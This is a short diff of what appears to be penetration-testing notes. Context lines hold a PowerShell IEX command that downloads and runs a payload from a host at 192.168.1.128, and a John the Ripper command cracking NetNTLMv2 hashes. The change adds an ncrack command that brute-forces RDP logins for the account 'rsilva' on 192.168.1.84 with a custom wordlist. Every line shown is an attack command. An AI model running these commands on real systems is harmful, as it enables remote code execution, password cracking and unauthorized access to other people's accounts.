@@ -19,6 +19,6 @@ IEX (New-Object Net.WebClient).DownloadString('http://192.168.1.128:8080/payload
 
 john --wordlist=wordlist_personalizada_advanced.txt --format=netntlmv2 hash_john.txt
 
-set PASS_FILE /home/ray_king/wordlist_personalizada_advanced.txt
+ncrack -p 3389 -U <(echo rsilva) -P /home/ray_king/wordlist_personalizada_advanced.txt 192.168.1.84
 
 
